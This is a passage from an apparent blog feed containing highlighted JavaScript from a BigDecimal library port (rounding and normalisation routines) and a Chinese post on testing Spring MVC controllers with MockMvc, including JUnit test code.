<span class="keyword">this</span>.exp=<span class="keyword">this</span>.exp+adjust; <span class="comment">// exponent of result</span></span><br><span class="line">  sign=<span class="keyword">this</span>.ind; <span class="comment">// save [assumes -1, 0, 1]</span></span><br><span class="line">  oldmant=<span class="keyword">this</span>.mant; <span class="comment">// save</span></span><br><span class="line">  <span class="keyword">if</span> (len&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// remove the unwanted digits</span></span><br><span class="line">    <span class="keyword">this</span>.mant=<span class="keyword">new</span> <span class="built_in">Array</span>(len);</span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)oldmant,0,(java.lang.Object)mant,0,len);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(oldmant,<span class="number">0</span>,<span class="keyword">this</span>.mant,<span class="number">0</span>,len);</span><br><span class="line">    reuse=<span class="literal">true</span>; <span class="comment">// can reuse mantissa</span></span><br><span class="line">    first=oldmant[len]; <span class="comment">// first of discarded digits</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* len&lt;=0 */</span></span><br><span class="line">    <span class="keyword">this</span>.mant=<span class="keyword">this</span>.ZERO.mant;</span><br><span class="line">    <span class="keyword">this</span>.ind=<span class="keyword">this</span>.iszero;</span><br><span class="line">    reuse=<span class="literal">false</span>; <span class="comment">// cannot reuse mantissa</span></span><br><span class="line">    <span class="keyword">if</span> (len==<span class="number">0</span>)</span><br><span class="line">     first=oldmant[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     first=<span class="number">0</span>; <span class="comment">// [virtual digit]</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// decide rounding adjustment depending on mode, sign, and discarded digits</span></span><br><span class="line">  increment=<span class="number">0</span>; <span class="comment">// bumper</span></span><br><span class="line">  &#123;<span class="attr">modes</span>:<span class="keyword">do</span>&#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_HALF_UP)</span><br><span class="line">   &#123; <span class="comment">// default first [most common]</span></span><br><span class="line">    <span class="keyword">if</span> (first&gt;=<span class="number">5</span>)</span><br><span class="line">     increment=sign;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_UNNECESSARY)</span><br><span class="line">   &#123; <span class="comment">// default for setScale()</span></span><br><span class="line">    <span class="comment">// discarding any non-zero digits is an error</span></span><br><span class="line">    <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len))))</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"round(): Rounding necessary"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_HALF_DOWN)</span><br><span class="line">   &#123; <span class="comment">// 0.5000 goes down</span></span><br><span class="line">    <span class="keyword">if</span> (first&gt;<span class="number">5</span>)</span><br><span class="line">     increment=sign;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">if</span> (first==<span class="number">5</span>)</span><br><span class="line">      <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len+<span class="number">1</span>))))</span><br><span class="line">       increment=sign;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_HALF_EVEN)</span><br><span class="line">   &#123; <span class="comment">// 0.5000 goes down if left digit even</span></span><br><span class="line">    <span class="keyword">if</span> (first&gt;<span class="number">5</span>)</span><br><span class="line">     increment=sign;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">if</span> (first==<span class="number">5</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len+<span class="number">1</span>))))</span><br><span class="line">        increment=sign;</span><br><span class="line">       <span class="keyword">else</span> <span class="comment">/* 0.5000 */</span></span><br><span class="line">        <span class="keyword">if</span> ((((<span class="keyword">this</span>.mant[<span class="keyword">this</span>.mant.length<span class="number">-1</span>])%<span class="number">2</span>))==<span class="number">1</span>)</span><br><span class="line">         increment=sign;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_DOWN)</span><br><span class="line">   &#123;&#125; <span class="comment">// never increment</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_UP)</span><br><span class="line">   &#123; <span class="comment">// increment if discarded non-zero</span></span><br><span class="line">    <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len))))</span><br><span class="line">     increment=sign;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_CEILING)</span><br><span class="line">   &#123; <span class="comment">// more positive</span></span><br><span class="line">    <span class="keyword">if</span> (sign&gt;<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len))))</span><br><span class="line">      increment=sign;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (mode==<span class="keyword">this</span>.ROUND_FLOOR)</span><br><span class="line">   &#123; <span class="comment">// more negative</span></span><br><span class="line">    <span class="keyword">if</span> (sign&lt;<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(oldmant,len))))</span><br><span class="line">      increment=sign;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"round(): Bad round value: "</span>+mode;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*modes*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (increment!=<span class="number">0</span>)</span><br><span class="line">   &#123;<span class="attr">bump</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.iszero)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="comment">// we must not subtract from 0, but result is trivial anyway</span></span><br><span class="line">      <span class="keyword">this</span>.mant=<span class="keyword">this</span>.ONE.mant;</span><br><span class="line">      <span class="keyword">this</span>.ind=increment;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">      <span class="comment">// mantissa is non-0; we can safely add or subtract 1</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.isneg)</span><br><span class="line">       increment=-increment;</span><br><span class="line">      newmant=<span class="keyword">this</span>.byteaddsub(<span class="keyword">this</span>.mant,<span class="keyword">this</span>.mant.length,<span class="keyword">this</span>.ONE.mant,<span class="number">1</span>,increment,reuse);</span><br><span class="line">      <span class="keyword">if</span> (newmant.length&gt;<span class="keyword">this</span>.mant.length)</span><br><span class="line">       &#123; <span class="comment">// had a carry</span></span><br><span class="line">        <span class="comment">// drop rightmost digit and raise exponent</span></span><br><span class="line">        <span class="keyword">this</span>.exp++;</span><br><span class="line">        <span class="comment">// mant is already the correct length</span></span><br><span class="line">        <span class="comment">//java.lang.System.arraycopy((java.lang.Object)newmant,0,(java.lang.Object)mant,0,mant.length);</span></span><br><span class="line">        <span class="keyword">this</span>.arraycopy(newmant,<span class="number">0</span>,<span class="keyword">this</span>.mant,<span class="number">0</span>,<span class="keyword">this</span>.mant.length);</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">this</span>.mant=newmant;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*bump*/</span></span><br><span class="line">  <span class="comment">// rounding can increase exponent significantly</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.exp&gt;<span class="keyword">this</span>.MaxExp)</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"round(): Exponent Overflow: "</span>+<span class="keyword">this</span>.exp;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Test if rightmost digits are all 0.</span></span><br><span class="line"><span class="comment">    Arg1 is a mantissa array to test</span></span><br><span class="line"><span class="comment">    Arg2 is the offset of first digit to check</span></span><br><span class="line"><span class="comment">            [may be negative; if so, digits to left are 0's]</span></span><br><span class="line"><span class="comment">    returns 1 if all the digits starting at Arg2 are 0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Arg2 may be beyond array bounds, in which case 1 is returned</span></span><br><span class="line"><span class="comment">    &lt;/sgml&gt; */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private static final boolean allzero(byte array[],int start)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">allzero</span>(<span class="params">array, start</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (start&lt;<span class="number">0</span>)</span><br><span class="line">   start=<span class="number">0</span>;</span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">25</span>=array.length<span class="number">-1</span>;i=start;i:<span class="keyword">for</span>(;i&lt;=$<span class="number">25</span>;i++)&#123;</span><br><span class="line">   <span class="keyword">if</span> (array[i]!=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Carry out final checks and canonicalization</span></span><br><span class="line"><span class="comment">    &lt;p&gt;</span></span><br><span class="line"><span class="comment">    This finishes off the current number by:</span></span><br><span class="line"><span class="comment">      1. Rounding if necessary (NB: length includes leading zeros)</span></span><br><span class="line"><span class="comment">      2. Stripping trailing zeros (if requested and \PLAIN)</span></span><br><span class="line"><span class="comment">      3. Stripping leading zeros (always)</span></span><br><span class="line"><span class="comment">      4. Selecting exponential notation (if required)</span></span><br><span class="line"><span class="comment">      5. Converting a zero result to just '0' (if \PLAIN)</span></span><br><span class="line"><span class="comment">    In practice, these operations overlap and share code.</span></span><br><span class="line"><span class="comment">    It always sets form.</span></span><br><span class="line"><span class="comment">    &lt;/sgml&gt;</span></span><br><span class="line"><span class="comment">    Arg1 is requested MathContext (length to round to, trigger, and FORM)</span></span><br><span class="line"><span class="comment">    Arg2 is 1 if trailing insignificant zeros should be removed after</span></span><br><span class="line"><span class="comment">         round (for division, etc.), provided that set.form isn't PLAIN.</span></span><br><span class="line"><span class="comment">   returns this, for convenience</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private com.ibm.icu.math.BigDecimal finish(com.ibm.icu.math.MathContext set,boolean strip)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">finish</span>(<span class="params">set, strip</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int d=0;</span></span><br><span class="line">  <span class="keyword">var</span> d=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte newmant[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newmant=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int mag=0;</span></span><br><span class="line">  <span class="keyword">var</span> mag=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int sig=0;</span></span><br><span class="line">  <span class="keyword">var</span> sig=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Round if mantissa too long and digits requested */</span></span><br><span class="line">  <span class="keyword">if</span> (set.digits!=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.mant.length&gt;set.digits)</span><br><span class="line">    <span class="keyword">this</span>.round(set);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If strip requested (and standard formatting), remove</span></span><br><span class="line"><span class="comment">     insignificant trailing zeros. */</span></span><br><span class="line">  <span class="keyword">if</span> (strip)</span><br><span class="line">   <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">    &#123;</span><br><span class="line">     d=<span class="keyword">this</span>.mant.length;</span><br><span class="line">     <span class="comment">/* see if we need to drop any trailing zeros */</span></span><br><span class="line">     &#123;i=d<span class="number">-1</span>;i:<span class="keyword">for</span>(;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.mant[i]!=<span class="number">0</span>)</span><br><span class="line">       <span class="keyword">break</span> i;</span><br><span class="line">      d--;</span><br><span class="line">      <span class="keyword">this</span>.exp++;</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;<span class="comment">/*i*/</span></span><br><span class="line">     <span class="keyword">if</span> (d&lt;<span class="keyword">this</span>.mant.length)</span><br><span class="line">      &#123;<span class="comment">/* need to reduce */</span></span><br><span class="line">       newmant=<span class="keyword">new</span> <span class="built_in">Array</span>(d);</span><br><span class="line">       <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)this.mant,0,(java.lang.Object)newmant,0,d);</span></span><br><span class="line">       <span class="keyword">this</span>.arraycopy(<span class="keyword">this</span>.mant,<span class="number">0</span>,newmant,<span class="number">0</span>,d);</span><br><span class="line">       <span class="keyword">this</span>.mant=newmant;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.form=MathContext.prototype.PLAIN; <span class="comment">// preset</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now check for leading- and all- zeros in mantissa */</span></span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">26</span>=<span class="keyword">this</span>.mant.length;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">26</span>&gt;<span class="number">0</span>;$<span class="number">26</span>--,i++)&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.mant[i]!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment">// non-0 result; ind will be correct</span></span><br><span class="line">     <span class="comment">// remove leading zeros [e.g., after subtract]</span></span><br><span class="line">     <span class="keyword">if</span> (i&gt;<span class="number">0</span>)</span><br><span class="line">      &#123;<span class="attr">delead</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">       newmant=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="keyword">this</span>.mant.length-i);</span><br><span class="line">       <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)this.mant,i,(java.lang.Object)newmant,0,this.mant.length-i);</span></span><br><span class="line">       <span class="keyword">this</span>.arraycopy(<span class="keyword">this</span>.mant,i,newmant,<span class="number">0</span>,<span class="keyword">this</span>.mant.length-i);</span><br><span class="line">       <span class="keyword">this</span>.mant=newmant;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*delead*/</span></span><br><span class="line">     <span class="comment">// now determine form if not PLAIN</span></span><br><span class="line">     mag=<span class="keyword">this</span>.exp+<span class="keyword">this</span>.mant.length;</span><br><span class="line">     <span class="keyword">if</span> (mag&gt;<span class="number">0</span>)</span><br><span class="line">      &#123; <span class="comment">// most common path</span></span><br><span class="line">       <span class="keyword">if</span> (mag&gt;set.digits)</span><br><span class="line">        <span class="keyword">if</span> (set.digits!=<span class="number">0</span>)</span><br><span class="line">         <span class="keyword">this</span>.form=set.form;</span><br><span class="line">       <span class="keyword">if</span> ((mag<span class="number">-1</span>)&lt;=<span class="keyword">this</span>.MaxExp)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// no overflow; quick return</span></span><br><span class="line">      &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> (mag&lt;(<span class="number">-5</span>))</span><br><span class="line">       <span class="keyword">this</span>.form=set.form;</span><br><span class="line">     <span class="comment">/* check for overflow */</span></span><br><span class="line">     mag--;</span><br><span class="line">     <span class="keyword">if</span> ((mag&lt;<span class="keyword">this</span>.MinExp)||(mag&gt;<span class="keyword">this</span>.MaxExp))</span><br><span class="line">      &#123;<span class="attr">overflow</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">       <span class="comment">// possible reprieve if form is engineering</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.form==MathContext.prototype.ENGINEERING)</span><br><span class="line">        &#123;</span><br><span class="line">         sig=mag%<span class="number">3</span>; <span class="comment">// leftover</span></span><br><span class="line">         <span class="keyword">if</span> (sig&lt;<span class="number">0</span>)</span><br><span class="line">          sig=<span class="number">3</span>+sig; <span class="comment">// negative exponent</span></span><br><span class="line">         mag=mag-sig; <span class="comment">// exponent to use</span></span><br><span class="line">         <span class="comment">// 1999.06.29: second test here must be MaxExp</span></span><br><span class="line">         <span class="keyword">if</span> (mag&gt;=<span class="keyword">this</span>.MinExp)</span><br><span class="line">          <span class="keyword">if</span> (mag&lt;=<span class="keyword">this</span>.MaxExp)</span><br><span class="line">           <span class="keyword">break</span> overflow;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">throw</span> <span class="string">"finish(): Exponent Overflow: "</span>+mag;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*overflow*/</span></span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop through to here only if mantissa is all zeros</span></span><br><span class="line">  <span class="keyword">this</span>.ind=<span class="keyword">this</span>.iszero;</span><br><span class="line">  &#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">   <span class="keyword">this</span>.exp=<span class="number">0</span>; <span class="comment">// standard result; go to '0'</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.exp&gt;<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">this</span>.exp=<span class="number">0</span>; <span class="comment">// +ve exponent also goes to '0'</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">// a plain number with -ve exponent; preserve and check exponent</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.exp&lt;<span class="keyword">this</span>.MinExp)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"finish(): Exponent Overflow: "</span>+<span class="keyword">this</span>.exp;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.mant=<span class="keyword">this</span>.ZERO.mant; <span class="comment">// canonical mantissa</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isGreaterThan</span>(<span class="params">other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(other) &gt; <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isLessThan</span>(<span class="params">other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(other) &lt; <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isGreaterThanOrEqualTo</span>(<span class="params">other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(other) &gt;= <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isLessThanOrEqualTo</span>(<span class="params">other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(other) &lt;= <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isPositive</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(BigDecimal.prototype.ZERO) &gt; <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isNegative</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(BigDecimal.prototype.ZERO) &lt; <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isZero</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.compareTo(BigDecimal.prototype.ZERO) === <span class="number">0</span>;</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="keyword">return</span> BigDecimal;</span><br><span class="line">&#125;)(MathContext); <span class="comment">// BigDecimal depends on MathContext</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> define === <span class="string">"function"</span> &amp;&amp; define.amd != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="comment">// AMD-loader compatible resource declaration</span></span><br><span class="line">	<span class="comment">// require('bigdecimal') will return JS Object:</span></span><br><span class="line">	<span class="comment">// &#123;'BigDecimal':BigDecimalPointer, 'MathContext':MathContextPointer&#125;</span></span><br><span class="line">	define(&#123;<span class="string">'BigDecimal'</span>:BigDecimal, <span class="string">'MathContext'</span>:MathContext&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> === <span class="string">"object"</span>)&#123;</span><br><span class="line">	<span class="comment">// global-polluting outcome.</span></span><br><span class="line">	<span class="keyword">this</span>.BigDecimal = BigDecimal;</span><br><span class="line">	<span class="keyword">this</span>.MathContext = MathContext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;).call(<span class="keyword">this</span>); <span class="comment">// in browser 'this' will be 'window' or simulated window object in AMD-loading scenarios.</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> bigdecimal </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring mvc test by mock]]></title>
      <url>/2015/spring-mvc-test-by-mock/</url>
      <content type="html"><![CDATA[<p>本文主要介绍spring mvc mock测试</p>
<p>我们在写spring mvc controller时，一般情况下都是在浏览器测试<br>但是有时候，我们写的controller提供的是api接口，这时我们该怎么测试呢？<br>这时spring mvc给我们提供了一个很好的测试方法，mock test</p>
<p>多的不说了，直接看代码：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;</span><br><span class="line">import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.*;</span><br><span class="line">import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;</span><br><span class="line">import static org.springframework.test.web.servlet.setup.MockMvcBuilders.*;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import javax.annotation.Resource;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line">import org.junit.runner.RunWith;</span><br><span class="line">import org.test.BasicRespMessage;</span><br><span class="line">import org.test.controller.TestController;</span><br><span class="line">import org.springframework.mock.web.MockHttpServletRequest;</span><br><span class="line">import org.springframework.mock.web.MockHttpServletResponse;</span><br><span class="line">import org.springframework.test.annotation.Rollback;</span><br><span class="line">import org.springframework.test.context.ContextConfiguration;</span><br><span class="line">import org.springframework.test.context.junit4.AbstractTransactionalJUnit4SpringContextTests;</span><br><span class="line">import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line">import org.springframework.test.context.web.WebAppConfiguration;</span><br><span class="line">import org.springframework.test.web.servlet.MockMvc;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">@ContextConfiguration( locations = &#123; &quot;classpath*:spring/app-config.xml&quot;, &quot;classpath*:spring/mvc-config.xml&quot; &#125; )</span><br><span class="line">@WebAppConfiguration</span><br><span class="line">@RunWith( SpringJUnit4ClassRunner.class )</span><br><span class="line">public class TestController extends AbstractTransactionalJUnit4SpringContextTests &#123;</span><br><span class="line">	@Resource</span><br><span class="line">	private WebApplicationContext wac;</span><br><span class="line">	private MockMvc mockMvc;</span><br><span class="line">	@Before</span><br><span class="line">	public void setup()</span><br><span class="line">	&#123;</span><br><span class="line">		this.mockMvc = webAppContextSetup( this.wac ).build();</span><br><span class="line">	&#125;</span><br><span class="line">	@Test</span><br><span class="line">	@Rollback( false )</span><br><span class="line">	public void test0() throws Exception</span><br><span class="line">	&#123;</span><br><span class="line">		TestController		controller	= (TestController) this.applicationContext.getBean( &quot;testController&quot; );</span><br><span class="line">		MockHttpServletRequest	request		= new MockHttpServletRequest();</span><br><span class="line">		MockHttpServletResponse response	= new MockHttpServletResponse();</span><br><span class="line">		request.setMethod( &quot;POST&quot; );</span><br><span class="line">		request.addParameter( &quot;subject&quot;, &quot;数学&quot; );</span><br><span class="line">		request.addParameter( &quot;grade&quot;, &quot;66&quot; ); /* 六年级 */</span><br><span class="line">		request.addParameter( &quot;time&quot;, new Date().getTime() + &quot;&quot; );</span><br><span class="line">		request.addParameter( &quot;sign&quot;, new Date().getTime() + &quot;&quot; );</span><br><span class="line">		BasicRespMessage m = controller.test0( request, response );</span><br><span class="line">		System.out.println( &quot;---------&gt;&quot; + m.getStatusCode() + &quot;&lt;===&gt;&quot; + m.getStatusDesc() + &quot;&lt;===&gt;&quot; + m.getBody() );</span><br><span class="line">	&#125;</span><br><span class="line">	@Test</span><br><span class="line">	public void test1() throws Exception</span><br><span class="line">	&#123;</span><br><span class="line">		this.mockMvc.perform(                                   /*  */</span><br><span class="line">			put( &quot;/test/test0&quot; )                            /*  */</span><br><span class="line">			.param( &quot;subject&quot;, &quot;数学&quot; )                       /*  */</span><br><span class="line">			.param( &quot;grade&quot;, &quot;66&quot; )                         /* // 六年级 */</span><br><span class="line">			.param( &quot;time&quot;, new Date().getTime() + &quot;&quot; )     /*  */</span><br><span class="line">			.param( &quot;sign&quot;, new Date().getTime() + &quot;&quot; ) )   /*  */</span><br><span class="line">		.andExpect( status().isOk() )                           /*  */</span><br><span class="line">		.andDo( print() )</span><br><span class="line">		.andReturn();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>test0 method 是直接调用controller的method<br>test1 method 是请求url地址</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> spring mvc </tag>
            
            <tag> test </tag>
            
            <tag> mock </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[js实现图片预览]]></title>
      <url>/2015/js-pic-preview/</url>
      <content type="html"><![CDATA[<p>本篇文章讲解如何使用js实现图片预览功能</p>
<a id="more"></a>
